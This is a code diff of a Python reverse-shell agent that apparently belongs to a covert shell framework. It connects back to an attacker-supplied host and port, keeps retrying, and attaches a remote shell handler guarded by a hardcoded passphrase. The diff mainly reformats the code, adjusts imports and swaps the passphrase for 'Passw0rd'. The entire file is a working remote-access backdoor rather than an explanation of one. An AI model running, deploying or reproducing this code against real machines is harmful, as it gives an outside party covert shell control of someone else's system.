@@ -1,38 +1,41 @@
 #!/usr/bin/env python
-from server.core.handlers.impl import ExtendableShellHandler
-from server.core.orchestration import SimpleOrchestrator
-
+import os
 import sys
 import socket
 from time import sleep
 
-passphrase = "Pa55phra531"
+sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
+
+from server.core.handlers.impl import ExtendableShellHandler
+from server.core.orchestration import SimpleOrchestrator
+
+passphrase = "Passw0rd"
 addr = sys.argv[1], int(sys.argv[2])
-delay = int( sys.argv[3] )
+delay = int(sys.argv[3])
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 closed = True
 
-while True :
+while True:
 
-	if closed :
-		try :
+	if closed:
+		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect( addr )
 			closed = False
 		except Exception as e:
-			sleep( delay )
+			sleep(delay)
 			continue
 
-	def recv () :
+	def recv():
 		global closed
-		try :
+		try:
 			ret = s.recv(50)
 			if ret == '' :	  # in empty string socket is closed
 				closed = True
 				s.close()
-		except :
+		except:
 			closed = True
 			return ''
 			# print( "Connection Terminated" )
@@ -40,10 +43,10 @@ while True :
 		return ret
 
 
-	def send( raw ) :
-		return s.send( raw )
+	def send(raw):
+		return s.send(raw)
 
-	orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50, reverse = True )
-	handler = ExtendableShellHandler( recv, send, orch )	# Create the Handler Daemon Thread
+	orch = SimpleOrchestrator(passphrase, tag_length=2, out_length=50, in_length=50, reverse=True )
+	handler = ExtendableShellHandler(recv, send, orch)  # Create the Handler Daemon Thread
 
-	while not closed : sleep(1)
+	while not closed: sleep(1)
